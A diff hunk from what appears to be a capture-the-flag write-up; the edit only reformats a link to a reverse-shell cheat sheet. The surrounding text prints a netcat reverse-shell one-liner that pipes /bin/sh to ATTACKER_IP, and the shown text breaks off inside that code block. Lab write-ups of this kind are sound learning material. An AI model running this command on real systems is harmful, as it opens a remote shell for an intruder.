@@ -113,7 +113,7 @@ I found a binary called **runme** in the home directory of the **catlover** user
 
 Welp, looks like we need to find a way to upgrade our shell. Let's try opening a reverse shell back into our machine.
 
-I tried a few reverse shell payloads from **PayloadsAllTheThings** (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), before finding one that worked:
+I tried a few reverse shell payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), before finding one that worked:
 
 ``` 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
